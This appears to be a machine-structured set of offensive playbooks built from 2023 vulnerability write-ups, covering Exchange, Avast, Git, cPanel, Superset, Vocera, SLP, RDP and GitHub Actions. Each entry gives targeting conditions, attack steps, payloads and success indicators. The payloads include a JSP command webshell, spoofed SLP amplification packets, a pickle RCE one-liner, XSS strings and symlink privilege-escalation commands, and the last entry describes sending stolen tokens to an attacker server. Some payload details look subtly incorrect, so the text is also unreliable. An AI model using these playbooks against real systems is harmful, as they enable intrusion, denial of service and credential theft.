Older versions of Microsoft Exchange Server prior to relevant patches for CVE-2023-21707 and CVE-2022-41082.
skip_if: Target Exchange server is fully patched against CVE-2023-21707.
PowerShell Remoting is disabled or inaccessible to authenticated users.
WAF or other security controls block the specific serialized payloads.

recon_steps: Step 1: Identify accessible Microsoft Exchange PowerShell Remoting endpoints for authenticated users.
Step 2: Determine the version of Microsoft Exchange Server to check for known vulnerabilities like CVE-2023-21707.
attack_steps: Step 1: Craft a malicious serialized payload that leverages the BinaryFormatter for deserialization. This payload should be designed to exploit the `System.Management.Automation.InternalDeserializer.ReadOneObject()` sink.
Step 2: The payload should aim to trigger the `XamlReader.Parse(string)` method through the `LanguagePrimitives.ConvertTo()` function, specifically targeting a `System.Type` object that leads to RCE.
Step 3: Submit the crafted payload to the vulnerable PowerShell Remoting endpoint. The writeup implies that a specific deserialization process occurs within Exchange that can be manipulated.
Step 4: Observe the response for signs of code execution or a callback indicating successful exploitation.
payloads_or_patterns: Insufficient detail in writeup. The writeup describes the theoretical process but does not provide a concrete, ready-to-use payload. It mentions the use of BinaryFormatter and the `XamlReader.Parse(string)` sink.
tools_recommended: ysoserial (for generating .NET deserialization payloads)
PowerShell (for interacting with Exchange Remoting endpoints)
success_indicators: Successful execution of arbitrary code on the Exchange server.
A callback from the target server to an attacker-controlled listener (e.g., Burp Collaborator, Cobalt Strike).
failure_indicators: Receiving an error response indicating invalid data or an unsupported format.
No callback or evidence of code execution.
400 or 500 level errors indicating issues with the request processing.

playbooks.impact: Remote Code Execution (RCE) on the Microsoft Exchange server, allowing an attacker to gain full control of the compromised server, access sensitive data, and potentially pivot to other systems within the network.
playbooks.key_lesson: Always investigate insecure deserialization vulnerabilities in .NET applications, especially those that handle serialized data from untrusted or potentially attacker-controlled sources. Pay close attention to sinks like `XamlReader.Parse()` and the use of `BinaryFormatter` with custom type converters.

meta.title: State of DNS Rebinding in 2023

trigger_conditions.when_to_apply: This technique is applicable when a target application or service is accessible from the internet and relies on DNS resolution for internal resource access. It's particularly relevant for internal services that are exposed to the internet or where an attacker can influence DNS resolution for a target domain.
prerequisites: Attacker must have control over a domain that the target can resolve via DNS.
Target must be susceptible to DNS rebinding attacks, meaning it performs DNS lookups for hostnames and acts on the resolved IP addresses, often with insufficient validation.
applicability_signals: Application performs dynamic DNS lookups during its operation.
Application relies on resolving external hostnames for functionality.
Application might be exposing internal network resources or services.
skip_if: Target does not perform dynamic DNS resolution.
Target enforces strict IP address validation on resolved hostnames.
Application is designed to run in a fully isolated network with no external DNS resolution capabilities.

recon_steps: Step 1: Identify target applications or services that are accessible from the internet and appear to interact with other hosts or services.
Step 2: Analyze network traffic or application behavior to determine if dynamic DNS resolution is occurring for internal or external resources.
attack_steps: Step 1: Set up a malicious DNS server controlled by the attacker.
Step 2: Configure the malicious DNS server to initially resolve a controlled domain name to a public IP address.
Step 3: Have the target system resolve the controlled domain name. The initial resolution will point to the attacker's public server.
Step 4: After a short time, change the DNS record for the controlled domain name to resolve to an internal IP address of the target network or a sensitive internal service.
Step 5: Observe if the target system makes connections to the newly resolved internal IP address, potentially allowing the attacker to interact with internal services.
payloads_or_patterns: DNS A record pointing to attacker's IP address, followed by A record pointing to internal IP address of target.
tools_recommended: dnsmasq (for DNS server control)
Burp Suite Collaborator (to detect callbacks from internal services)
success_indicators: Callback received on attacker's controlled server (e.g., Burp Collaborator) from an internal IP address of the target network.
Successful interaction with internal services that were not intended to be exposed externally.
failure_indicators: No callbacks received after the DNS record has been rebinded.
Target's security mechanisms (e.g., firewall rules, IP validation) prevent connection to the internal IP address.

playbooks.impact: Allows an attacker to bypass network security controls and access internal services or resources that are not directly exposed to the internet. This can lead to further exploitation, data exfiltration, or command execution on internal systems.
playbooks.key_lesson: Always validate the origin and IP address of any resolved hostname before establishing a connection or trusting the resolved resource, especially in environments where DNS resolution can be influenced.

meta.title: Avast Anti-Virus privileged arbitrary file create on virus quarantine (CVE-2023-1585 and CVE-2023-1587)

tech_stack_fingerprints: AvastSvc.exe process running with SYSTEM privileges

trigger_conditions.when_to_apply: When Avast Anti-Virus detects a file virus and initiates the deletion process in the SYSTEM context, and the attacker can control or influence the parent directory of the file being quarantined.
prerequisites: Attacker has the ability to create or modify file system permissions on a directory that Avast will attempt to quarantine a file from.
Avast Anti-Virus version is vulnerable (e.g., >= 22.3.6008).
applicability_signals: Avast service attempting to quarantine a file detected as malicious.
The quarantine process involves path manipulation and deletion operations performed by a SYSTEM-level process.
skip_if: The parent directory where the file is quarantined is not writable by the attacker.
The Avast quarantine process is not running with SYSTEM privileges.

recon_steps: Identify a file that Avast Anti-Virus will detect as malicious and attempt to quarantine.
Observe the behavior of the Avast quarantine process, specifically looking for operations performed by the `AvastSvc.exe` process in the SYSTEM context.
attack_steps: Step 1: Create a directory that will be used for quarantine, and set restrictive permissions for the SYSTEM account, specifically denying `FILE_ADD_FILE` (as per writeup step 1).
Step 2: Place a malicious file in this directory that Avast will detect.
Step 3: Trigger Avast to detect and quarantine the malicious file.

Step 4: During the time window between Avast's path checking and the actual file deletion, use a symbolic link or junction to redirect the path to a critical system directory (e.g., `C:\ProgramData\Avast Software\Avast\fw`).
Step 5: After the vulnerable deletion operation, the attacker can then manipulate the contents of the recreated `C:\ProgramData\Avast Software\Avast\fw` directory, which has permissive DACLs.
Step 6: Execute a privileged `CopyFile()` operation (gadget) within the attacker-controlled directory to achieve an arbitrary file write.
Step 7: To escalate to code execution, delete the contents of `C:\ProgramData\Avast Software\Avast\fw`, then delete the directory itself.

Step 8: Cause `AvastSvc.exe` to crash or restart (e.g., via reboot or a crash PoC). Upon restart, the service will recreate the `C:\ProgramData\Avast Software\Avast\fw` directory with permissive DACLs.
Step 9: Call an RPC-method that will execute a privileged `CopyFile()` in this newly created, attacker-controlled directory, leading to arbitrary file write and SYSTEM code execution.
payloads_or_patterns: Symbolic link creation command: `mklink /D <target_path> <link_target>` (e.g., `mklink /D C:\path\to\quarantine\malware.dll C:\ProgramData\Avast Software\Avast\fw`)
File system permission modification: `icacls <directory_path> /deny SYSTEM:(OI)(CI)FILE_ADD_FILE`
Payload to trigger `AvastSvc.exe` restart/crash (specific payload not detailed in writeup, likely OS-level manipulation)
Privileged `CopyFile()` gadget (specific gadget not detailed in writeup, exploit relies on existing Windows kernel mechanisms)
tools_recommended: Sysinternals Suite (for process monitoring, file access monitoring, and potentially manipulating system processes)
NirCmd (for easily manipulating file system permissions and other system tasks)
Custom scripts for creating junctions/symbolic links and managing file system permissions
success_indicators: Successful arbitrary file write achieved via the privileged `CopyFile()` gadget into the attacker-controlled `C:\ProgramData\Avast Software\Avast\fw` directory.
Code execution in the SYSTEM context, confirmed by creating a file in `C:\Windows\System32` or executing a command with SYSTEM privileges.
failure_indicators: Avast successfully quarantines the file without the attacker's redirection taking effect (e.g., `STATUS_ACCESS_DENIED` during junction creation before the quarantine process starts).
The `AvastSvc.exe` process does not restart or crash as expected, preventing the recreation of the permissive directory.
The `CopyFile()` operation fails with unexpected errors, indicating the target directory is not writable or the gadget is not properly triggered.

playbooks.impact: Arbitrary file write with SYSTEM privileges, leading to full SYSTEM code execution. This allows an attacker to compromise the entire machine, install persistent malware, exfiltrate sensitive data, or disable security measures.
playbooks.key_lesson: When an anti-virus service performs privileged file operations like deletion, always test for Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities by manipulating file system links or permissions during the operation's execution window.

meta.title: Git Arbitrary Configuration Injection (CVE-2023-29007)

target_profile.required_access_level: developer | user with write access to repo

trigger_conditions.when_to_apply: When a Git repository contains or can be made to contain configuration entries longer than 1024 characters, and specific Git operations that call `git_config_copy_or_rename_section_in_file` are performed.
prerequisites: Attacker can control configuration values within a Git repository, such as through excessively long submodule URLs in `.gitmodules` or by directly manipulating configuration files.
The target system uses a vulnerable version of Git (<= 2.40.0).
applicability_signals: Existence of `.gitmodules` file
Possibility to control submodule URLs or other configuration parameters that can exceed 1024 characters.
Use of Git operations like `git submodule init`, `git submodule deinit`, `git branch delete`, or `git remote remove`.
skip_if: Target system is using Git version 2.40.1 or later.
All Git configuration values are confirmed to be below the 1024 character limit and cannot be influenced by the attacker.

recon_steps: Step 1: Identify Git version being used by the target system. Check `git --version`.
Step 2: Analyze the `.gitmodules` file or other configuration sources for excessively long URLs or configuration values.
attack_steps: Step 1: Create or modify a `.gitmodules` file in a local Git repository to include a submodule with an overly long URL (exceeding 1024 characters). The URL should be crafted such that when truncated or processed, it begins with a `[` character after potential whitespace, or directly starts with `[`.
Step 2: Commit these changes to the repository.
Step 3: Initialize the submodule using `git submodule init` or deinitialize it using `git submodule deinit` within the repository.
Step 4: Observe the `.git/config` file for the injection of new configuration sections derived from the crafted submodule URL.
payloads_or_patterns:
Example of an overly long submodule URL that might be interpreted as a new section upon truncation or processing during `git submodule deinit` or similar operations:

`url = https://attacker.com/repo/.... (1000+ characters ending with [section_name]variable = payload)`

Actual exploit payloads for RCE involve carefully crafted configuration keys like `core.pager`, `core.editor`, or `core.sshCommand` within the injected section, pointing to attacker-controlled executables or scripts.
tools_recommended: Git CLI: for performing submodule operations and inspecting config files.
Text editor: for crafting malicious configuration values.
success_indicators: The `.git/config` file of the victim contains new, unexpected configuration sections.

If `core.pager`, `core.editor`, or `core.sshCommand` were targeted, observing the execution of arbitrary commands when the victim uses these Git features (e.g., viewing diffs, editing commit messages, SSH operations).
failure_indicators: `.git/config` remains unchanged after attempting the operations. This might indicate the Git version is patched, the payload length is insufficient, or the crafted section name does not meet the parsing criteria. Pivot by trying different lengths or different configuration variable names.
Git command fails with an error message indicating an invalid configuration. Review the payload for syntax errors.
No RCE is achieved even with configuration injection. Ensure the injected configuration keys (e.g., `core.pager`) are actually used by Git in the workflow the attacker can influence.

playbooks.impact: Arbitrary Code Execution (ACE) on the user's machine. An attacker can inject malicious configuration into a user's `.git/config` file, leading to the execution of arbitrary commands when the user performs certain Git operations.
playbooks.key_lesson: Always validate and sanitize input lengths in Git configuration parsing functions, especially when dealing with operations that can rename or delete configuration sections, to prevent arbitrary configuration injection.

meta.title: Finding XSS in a million websites (cPanel CVE-2023-29489)

affected_components: website managed by cPanel on ports 80 and 443

trigger_conditions.when_to_apply: This vulnerability is applicable to any cPanel installation that has not been updated to a patched version and is accessible via standard web ports (80, 443) or its management ports (2080-2087).
prerequisites: The target must be running a vulnerable version of cPanel.
The target must be accessible over the internet.
applicability_signals: cPanel login page is accessible.
The presence of specific cPanel version information (if obtainable).
The target responds on ports 80, 443, 2080, 2082, 2083, 2086, or 2087.
skip_if: cPanel auto-update is enabled and has successfully patched the vulnerability.
The target's network is completely inaccessible from the attacker's network.
A WAF is actively blocking all known XSS payloads.

recon_steps: Step 1: Scan target IP addresses for open ports 80, 443, 2080, 2082, 2083, 2086, 2087 to identify cPanel installations.
Step 2: Attempt to access the cPanel login page (e.g., <TARGET_URL>:2083/login/) to confirm its presence and identify potential version information.
attack_steps: Step 1: Craft a URL with a malicious payload targeting an injectable parameter. The writeup mentions a vulnerability in the `/cgi-sys/` directory and the `cpsrvd` binary, and that the XSS was reflected, implying a GET or POST request with user-controlled input.

Step 2: Identify a parameter that reflects user input within the cPanel web interface or its associated scripts. Based on the writeup's focus on `/cgi-sys/` and the general nature of reflected XSS, parameters in GET requests are a common starting point.
Step 3: Inject a standard XSS payload into the identified parameter. A simple payload like `<script>alert(document.domain)</script>` is a good starting point.
Step 4: Observe the response for the execution of the payload (e.g., an alert box appearing).
payloads_or_patterns: <TARGET_URL>/<path_to_vulnerable_script>?<PARAM_NAME>=<script>alert(document.domain)</script>
tools_recommended: Burp Suite: To intercept requests, modify parameters, and analyze responses.
OWASP ZAP: For automated scanning and manual testing.
Nmap: For port scanning and service detection.
success_indicators: An alert box pops up with the domain of the target site.
The injected JavaScript code is rendered and executed within the victim's browser context.
Browser developer console shows JavaScript errors related to successful XSS execution.
failure_indicators: No alert box appears, and the injected payload is rendered as plain text or HTML encoded.
A WAF block page is displayed (e.g., 403 Forbidden).
The target URL returns a server error (e.g., 500 Internal Server Error) indicating a potential crash or unexpected behavior.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, allowing for session hijacking, phishing, redirection to malicious sites, or defacement.
playbooks.key_lesson: Always test user-controlled input parameters in web applications, especially those handling sensitive operations or providing administrative interfaces, for reflected cross-site scripting vulnerabilities.

meta.title: Never Connect to RDP Servers Over Untrusted Networks

trigger_conditions.when_to_apply: When an RDP server is accessible over an untrusted network (e.g., the internet) without proper security controls like VPNs or RDP gateways.
prerequisites: Target RDP server is directly exposed to an untrusted network.
RDP port (default 3389) is open and reachable.
applicability_signals: Nmap scan reveals port 3389 open on a public IP address.
Banner grabbing on port 3389 indicates an RDP service.
skip_if: RDP is only accessible via VPN or RDP Gateway.
RDP port is firewalled from untrusted networks.
Authentication is strictly enforced and multi-factor authentication is required.

recon_steps: Step 1: Scan target IP ranges for open RDP port 3389 using nmap (e.g., nmap -p 3389 <target_ip>).
Step 2: Perform banner grabbing on port 3389 to confirm it's an RDP service and note the version information if available.
attack_steps: Step 1: Attempt to connect directly to the RDP server over the untrusted network using an RDP client.
Step 2: If a connection is established, attempt brute-force or default credential attacks.
Step 3: If successful, the attacker gains direct access to the RDP server.
payloads_or_patterns: RDP connection attempts to <TARGET_IP>:3389
tools_recommended: Nmap for port scanning.
Hydra or Medusa for RDP brute-forcing.
Remote Desktop Connection client.
success_indicators: Successful RDP login prompt.
Direct RDP session established without VPN or gateway.
Successful brute-force login.
failure_indicators: Connection refused or timed out (port closed or firewalled).
RDP client shows an error message indicating connection issues or authentication failure after multiple attempts.
WAF blocking or rate limiting connection attempts.

playbooks.impact: Direct access to the compromised RDP server, allowing for lateral movement, data theft, ransomware deployment, or further network compromise.
playbooks.key_lesson: Always secure RDP endpoints by disabling direct internet exposure, using VPNs or RDP gateways, and implementing strong authentication with multi-factor authentication.

meta.title: CVE-2023-29552 Service Location Protocol - Denial of Service Amplification Attack

trigger_conditions.when_to_apply: When a target system is found to be running the Service Location Protocol (SLP) and is exposed to the internet, particularly if it's accessible via UDP port 427.
prerequisites: Target system must be running SLP.
Target system must be reachable over UDP port 427 (or TCP port 427).
applicability_signals: A UDP or TCP port 427 is open on the target.
A tool like `slpscan.py` or similar successfully identifies SLP traffic.
Responses indicative of SLP are observed on port 427.
skip_if: Target system does not respond to probes on UDP/TCP port 427.
Target system actively blocks SLP traffic.

recon_steps: Step 1: Scan UDP port 427 on the target for open SLP services. Use tools like `nmap -sU -p 427 <TARGET_IP>`.
Step 2: If UDP is blocked or no response, scan TCP port 427: `nmap -p 427 <TARGET_IP>`.

Step 3: Use a dedicated SLP scanner tool (e.g., `./slpscan.py -m svc_req_v2 -l <TARGET_IP>`) to confirm SLP service and capture initial packets. Look for responses like `b'\x02\x01\x00\x00...` or `b'\x02\x02\x00\x00...'`.
attack_steps: Step 1: Craft a spoofed SLP `service_request` or `register_request` packet originating from a controlled IP address and targeting the SLP DA (Directory Agent) or SA (Service Agent) on the victim. The request should be crafted to elicit a large response or trigger a recursive lookup.

Step 2: Send the spoofed UDP packet to the target's SLP port (427). The attacker's source IP address in the packet should be a different, potentially more valuable, target (e.g., a sensitive server or a large bandwidth server).

Step 3: The victim's SLP service will process the request, potentially by forwarding it to other SLP agents or by generating a verbose response, thus amplifying the original request and directing it to the spoofed IP address.
Step 4: Repeat steps 1-3 with different service types or attributes to maximize the amplification effect and flood the spoofed target.
payloads_or_patterns: Spoofed SLP `service_request` packet targeting a specific service type (e.g., 'service:.*') with a malicious source IP: `\x02\x01\x00\x00<length>\x00\x00\x00\x00\x00\x96\xdb\x00\x02en\x00\x00\x00\x00\x00\x07default\x00\x00\x00\x00` (modify length and service details)
Spoofed SLP `register_request` packet with a controlled IP as the sender of the registration.
tools_recommended: Scapy: For crafting and sending custom UDP packets with spoofed source IP addresses.
Nmap: For port scanning and service detection.
Custom Python script: To automate the creation and sending of spoofed SLP packets.
./slpscan.py: For initial reconnaissance and SLP identification.
success_indicators: Monitoring the spoofed target IP address shows a significant increase in incoming UDP traffic.
Network traffic analysis on the spoofed target reveals that the traffic originates from the vulnerable SLP service on the initial target.
The victim SLP service does not appear to be directly impacted, but a third-party system is receiving amplified traffic.
failure_indicators: No response from UDP/TCP port 427 indicates the service is not running or blocked. -> Pivot to other vulnerabilities.
SLP packets are correctly processed but no amplification occurs (e.g., responses are small and not directed to spoofed IPs). -> Try different service requests or a different target.

playbooks.impact: A Denial of Service (DoS) attack can be launched against a third-party system by exploiting a vulnerable SLP service. The attacker can amplify network traffic originating from the SLP service, overwhelming the chosen target with an overwhelming amount of data, making it unavailable to legitimate users.
playbooks.key_lesson: When SLP is exposed on UDP port 427, investigate its potential for amplification attacks by sending spoofed requests from controlled IP addresses to inundate other network resources.

meta.title: CVE-2023-27524: Insecure Default Configuration in Apache Superset Leads to Remote Code Execution

tech_stack_fingerprints: Presence of Flask framework (implied by secret key usage)

trigger_conditions.when_to_apply: When Apache Superset is deployed with its default configuration, particularly if the Flask secret key is not properly secured or is hardcoded.
prerequisites: Target is running Apache Superset.
The default `SECRET_KEY` in `superset_config.py` is either not set or is predictable/weak.
applicability_signals: Default `SECRET_KEY` value observed in configuration.
Absence of custom `SECRET_KEY` in deployed configuration.
skip_if: The `SECRET_KEY` is explicitly and securely configured to a unique, non-predictable value.
WAF or other security controls prevent specific request patterns needed for exploitation.

recon_steps: Step 1: Identify Apache Superset instances using Shodan or other network reconnaissance tools.
Step 2: Attempt to access the Superset web interface to confirm version and default configuration by looking for default login pages or error messages.
attack_steps: Step 1: Locate the `superset_config.py` file on the target server (if possible, through other vulnerabilities like LFI or misconfigurations).
Step 2: Examine the `SECRET_KEY` configuration. If it's a default or weak value (e.g., 'this-is-a-secret-key'), proceed with exploitation.
Step 3: Craft a malicious serialized Python object using a known weak pickle gadget (e.g., `os._wrap_close`).
Step 4: Serialize the object and encode it using base64.

Step 5: Craft an HTTP request to an endpoint that deserializes user-controlled input that is then processed by Flask's cookie signing mechanism, such as a POST request to `/login/`, submitting a crafted `session` cookie with the signed malicious payload.
Step 6: The server will deserialize the malicious object, leading to Remote Code Execution.
payloads_or_patterns: Example command for creating a malicious payload (requires `pickle` and `base64` modules): `python -c 'import pickle, base64; payload = pickle.dumps(lambda: __import__("os").system("whoami")); print(base64.b64encode(payload))'`

Example HTTP request using `curl` (modify payload and `SECRET_KEY`): `curl -X POST -d "username=admin&password=password" -c cookie.txt http://<TARGET_URL>/login/ && curl -X POST -b cookie.txt -H "Cookie: session=<BASE64_ENCODED_MALICIOUS_PICKLE_PAYLOAD>" http://<TARGET_URL>/api/v1/security/login` (Note: This is illustrative, the actual attack may involve different endpoints and cookie manipulation)
tools_recommended: Python with `pickle` and `base64` libraries for payload generation.
Burp Suite or OWASP ZAP for crafting and intercepting HTTP requests.
Network scanners (e.g., Nmap, Shodan) to discover Superset instances.
success_indicators: Execution of arbitrary commands on the target server (e.g., receiving output from `whoami`).
Server error messages indicating unexpected Python execution or deserialization errors that can be correlated with successful command execution.
Reverse shell connection established to the attacker's machine.
failure_indicators: HTTP 400 or 500 errors without command execution, potentially indicating incorrect payload format or deserialization issues.
Server responses indicating invalid session cookies, suggesting the `SECRET_KEY` is correct and not vulnerable.
Successful login but no RCE, indicating the secret key is secure but other vulnerabilities might exist.

playbooks.impact: Remote Code Execution on the server running Apache Superset. This allows an attacker to execute arbitrary commands with the privileges of the Superset application, potentially leading to full system compromise, data exfiltration, or further network pivoting.
playbooks.key_lesson: Always ensure sensitive configuration parameters like Flask's `SECRET_KEY` are uniquely generated, stored securely, and not left as defaults in production environments.

meta.title: Odoo: Get your Content Type right, or else!

affected_components: XML-RPC API endpoint (specific endpoint not detailed)

trigger_conditions.when_to_apply: When an authenticated user can make requests to an Odoo XML-RPC API endpoint that processes user-supplied data without properly validating the Content-Type header.
prerequisites: Attacker has an authenticated session within Odoo.
applicability_signals: Target accepts XML-RPC requests.
API endpoint does not strictly enforce `Content-Type: application/xml`.
skip_if: The API endpoint explicitly checks and rejects requests with incorrect Content-Type headers.

recon_steps: Identify Odoo API endpoints that accept user-controlled data.
Analyze the `Content-Type` header handling for these endpoints.
attack_steps: Step 1: Send a request to an identified Odoo XML-RPC API endpoint.
Step 2: Set the `Content-Type` header to something other than `application/xml` (e.g., `text/plain`).
Step 3: Include a malicious XML payload in the request body, designed to trigger an XSS vulnerability (e.g., by injecting `<script>alert(document.domain)</script>`).
Step 4: Observe the server's response and check if the injected script is executed or reflected in a way that indicates XSS.
payloads_or_patterns:
Content-Type: text/plain

<xml><methodCall><methodName>some.method</methodName><params><param><value><string><script>alert(document.domain)</script></string></value></param></params></methodCall>
tools_recommended: Burp Suite: To craft and send custom HTTP requests, modify headers and payloads.
success_indicators: The injected JavaScript code is executed in the victim's browser (e.g., an alert box appears with the domain name).
The malicious XML payload is reflected in the response in a way that causes script execution.
failure_indicators: The server returns a `400 Bad Request` or `415 Unsupported Media Type` error due to the incorrect `Content-Type` header.
The payload is not executed and is not reflected in a vulnerable manner.

playbooks.impact: Cross-Site Scripting (XSS) vulnerability, allowing attackers to execute arbitrary JavaScript in the context of other authenticated users. This can lead to session hijacking, phishing, or defacement.
playbooks.key_lesson: Always validate and enforce the `Content-Type` header for API endpoints, especially when processing XML or other structured data, to prevent unexpected parsing behavior and potential security vulnerabilities like XSS.

meta.title: Vocera Report Server Pwnage
meta.category: rce | arbitrary file upload | path traversal | zip slip attack

tech_stack_fingerprints: Vocera Report Server software detected (via research)

trigger_conditions.when_to_apply: When the Vocera Report Server's Task Scheduler or restoreSqlData functionality is accessible, allowing for control over file paths or uploaded files.
prerequisites: Knowledge of default credentials or ability to obtain valid user credentials.
Ability to interact with the 'Task Scheduler' feature or the 'restoreSqlData' endpoint.
Access to the server filesystem or network to observe file writes.
applicability_signals: Presence of a 'Task Scheduler' feature allowing task creation or modification.
Endpoints related to database restore or data management that accept file uploads.
Web server running on the target system, accessible to the attacker.
The application running with SYSTEM privileges (on Windows) or equivalent high privileges.
skip_if: No 'Task Scheduler' or similar file execution features available.
All file upload functionalities strictly validate file types and content, preventing arbitrary writes.
The application does not run with sufficient privileges to write to web directories.

recon_steps: Step 1: Identify Vocera Report Server instances via web scraping or known asset lists.
Step 2: Attempt to log in using default credentials or common password lists, or by exploiting other vulnerabilities to gain credentials.
Step 3: Analyze accessible endpoints, looking for features like 'Task Scheduler' or data import/export functionalities.
attack_steps: Step 1 (Authenticated RCE via Task Scheduler): Identify the 'Task Scheduler' feature. Create or modify a task, manipulating the `execFileName` parameter to include directory traversal (`../`) to escape the intended directory.
Step 2 (Authenticated RCE via Task Scheduler): Craft a payload that writes a malicious file (e.g., a Java JAR or script) to a web-accessible directory or a location that can be executed.
Step 3 (Authenticated RCE via Task Scheduler): Trigger the task, leveraging the path traversal to execute the crafted file.
Step 4 (Unauthenticated RCE via restoreSqlData): Identify the `restoreSqlData` endpoint or similar database management functionality.

Step 5 (Unauthenticated RCE via restoreSqlData): Prepare a ZIP file containing a malicious file (e.g., a webshell) that, when unzipped by the application, will overwrite a sensitive file or write to the webroot.

Step 6 (Unauthenticated RCE via restoreSqlData): Send a request to `restoreSqlData` with the `uploadFile` parameter pointing to the malicious ZIP archive, utilizing directory traversal if necessary to place the file correctly.
Step 7 (Unauthenticated RCE via restoreSqlData): If successful, the webshell or malicious file will be written to disk, allowing for remote code execution.
Step 8: Access the webshell or observe the execution of the planted code to confirm RCE.
payloads_or_patterns: Path traversal sequences: `../../..\` or similar, depending on OS and application behavior.

Malicious file content: e.g., a simple JSP webshell: `<% out.print(new java.io.File(".").getAbsolutePath()); %><% new java.io.InputStreamReader(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).transferTo(out); %>`
ZIP file structure designed for directory traversal (e.g., containing `../../webapps/ROOT/shell.jsp`)
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, fuzzing parameters.
JD-GUI or similar Java decompiler: For analyzing application code.
Zip utility: For crafting malicious ZIP archives.
Responder or similar LLMNR/NBT-NS poisoning tool: To capture hashes if initial authentication is required.
success_indicators: Successful write of a webshell to a web-accessible directory.
Execution of arbitrary commands via the webshell or direct execution.
Server response indicating successful file write or execution.
Callback from a reverse shell initiated by the executed payload.
failure_indicators: 403 Forbidden or similar access denied errors when attempting to write files.
Application errors indicating invalid file format or content during upload/unzipping.
No webshell found at the expected location after the operation.
WAF blocking malicious payloads or file writes.

playbooks.impact: Remote Code Execution (RCE) as SYSTEM on the target server, allowing complete compromise of the Vocera Report Server, including data access, modification, and further lateral movement within the network.
playbooks.key_lesson: When dealing with file upload or file path manipulation features in Java applications, be aware of how the application handles directory traversal and file unzipping, as these can lead to arbitrary file writes and subsequent RCE.

meta.title: Stealing GitHub staff's access token via GitHub Actions

trigger_conditions.when_to_apply: This attack applies when a repository utilizes self-hosted runners and has a workflow that triggers on pull requests originating from forked repositories. Specifically, when the workflow's environment is not isolated between job executions.
prerequisites: Target repository must use self-hosted runners.
Target repository must have a workflow triggered by a `pull_request` event.
The `pull_request` event must originate from a forked repository.
The self-hosted runner environment is not isolated between job executions.
applicability_signals: Existence of a workflow file (e.g., `e2etest.yml`) that sets up and uses self-hosted runners.
Workflow utilizes `pull_request` trigger, especially from forks.
Documentation or configuration indicating non-isolated environments for self-hosted runners.
The workflow involves building and registering self-hosted runners as part of its execution.
skip_if: The target system uses GitHub-hosted runners exclusively.
The self-hosted runner environment is confirmed to be isolated per job execution.
All pull requests are from within the same repository (not forks).

recon_steps: Identify repositories within GitHub that use self-hosted runners.
Examine workflows in those repositories for `pull_request` triggers, paying attention to those handling pull requests from forks.
attack_steps: Step 1: Create a fork of the target repository (e.g., `actions/runner`).
Step 2: Craft a pull request to the target repository from the forked repository.
Step 3: Modify the workflow file (e.g., `e2etest.yml`) in the forked repository to include a malicious step within the self-hosted runner execution phase.
Step 4: The malicious step should aim to exfiltrate sensitive information, such as access tokens, that might be present in the runner's environment during the workflow execution.
Step 5: Ensure the malicious step executes before the self-hosted runner is cleaned up or deregistered, leveraging the asynchronous nature of the script's runner discovery.
Step 6: The exfiltrated token should be sent to an attacker-controlled server or service.
